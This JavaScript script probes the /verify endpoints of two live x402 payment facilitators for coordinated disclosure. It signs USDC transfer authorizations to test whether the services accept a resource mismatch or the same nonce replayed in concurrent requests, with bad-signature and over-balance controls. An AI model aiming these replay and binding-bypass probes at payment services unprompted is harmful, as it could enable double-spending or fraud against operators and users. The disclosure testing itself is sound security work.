// Complete evidence capture for coordinated disclosure. Read-only /verify.
import { privateKeyToAccount } from "viem/accounts";
const acct=privateKeyToAccount(process.env.PROBE_PRIVATE_KEY);
const USDC="0x036CbD53842c5426634e7929541eC2318f3dCF7e", CHAIN=84532;
const PAYTO="0x1111111111111111111111111111111111111111";
const types={TransferWithAuthorization:[{name:"from",type:"address"},{name:"to",type:"address"},
 {name:"value",type:"uint256"},{name:"validAfter",type:"uint256"},{name:"validBefore",type:"uint256"},{name:"nonce",type:"bytes32"}]};
const rnd=()=>"0x"+[...crypto.getRandomValues(new Uint8Array(32))].map(b=>b.toString(16).padStart(2,"0")).join("");
async function v(base,{rq,rp,nonce,value="1000",badSig=false}){
  const vb=BigInt(Math.floor(Date.now()/1000)+3600);
  const m={from:acct.address,to:PAYTO,value:BigInt(value),validAfter:0n,validBefore:vb,nonce};
  let signature=await acct.signTypedData({domain:{name:"USDC",version:"2",chainId:CHAIN,verifyingContract:USDC},types,primaryType:"TransferWithAuthorization",message:m});
  if(badSig) signature="0x"+"00".repeat(65);
  const body={paymentPayload:{x402Version:2,accepted:{scheme:"exact",network:"eip155:84532"},resource:rp,
    payload:{signature,authorization:{from:m.from,to:m.to,value,validAfter:"0",validBefore:vb.toString(),nonce}}},
   paymentRequirements:{scheme:"exact",network:"eip155:84532",resource:rq,payTo:PAYTO,asset:USDC,
    amount:value,maxAmountRequired:value,maxTimeoutSeconds:60,description:"probe",mimeType:"application/json",extra:{name:"USDC",version:"2"}}};
  const r=await fetch(base+"/verify",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify(body)});
  return {status:r.status, body:await r.json()};
}
const A="https://probe.invalid/resource-A", B="https://probe.invalid/resource-B";
for (const [name,base] of [["Coinbase CDP","https://x402.org/facilitator"],["Dexter","https://x402.dexter.cash"]]) {
  console.log(`\n════ ${name} — ${base}`);
  const badsig=await v(base,{rq:A,rp:A,nonce:rnd(),badSig:true});
  const overbal=await v(base,{rq:A,rp:A,nonce:rnd(),value:"999999999999"});
  const ctrl=await v(base,{rq:A,rp:A,nonce:rnd()});
  const i3=await v(base,{rq:B,rp:A,nonce:rnd()});
  const n=rnd(); const [a,b]=await Promise.all([v(base,{rq:A,rp:A,nonce:n}),v(base,{rq:A,rp:A,nonce:n})]);
  const say=(l,r)=>console.log(`  ${l.padEnd(34)} isValid=${String(r.body.isValid).padEnd(5)} ${r.body.invalidReason??""}`);
  say("neg-control: bad signature",badsig);
  say("neg-control: over balance",overbal);
  say("CONTROL: resource matches",ctrl);
  say("I3: resource MISMATCH",i3);
  say("I4: nonce first use",a);
  say("I4: nonce SECOND, concurrent",b);
  const i3fail=ctrl.body.isValid===true&&i3.body.isValid===true;
  const i4fail=a.body.isValid===true&&b.body.isValid===true;
  const sane=badsig.body.isValid===false&&overbal.body.isValid===false;
  console.log(`  → controls sane: ${sane} | I3 ${i3fail?"FAIL":"pass"} | I4 ${i4fail?"FAIL":"pass"}`);
}
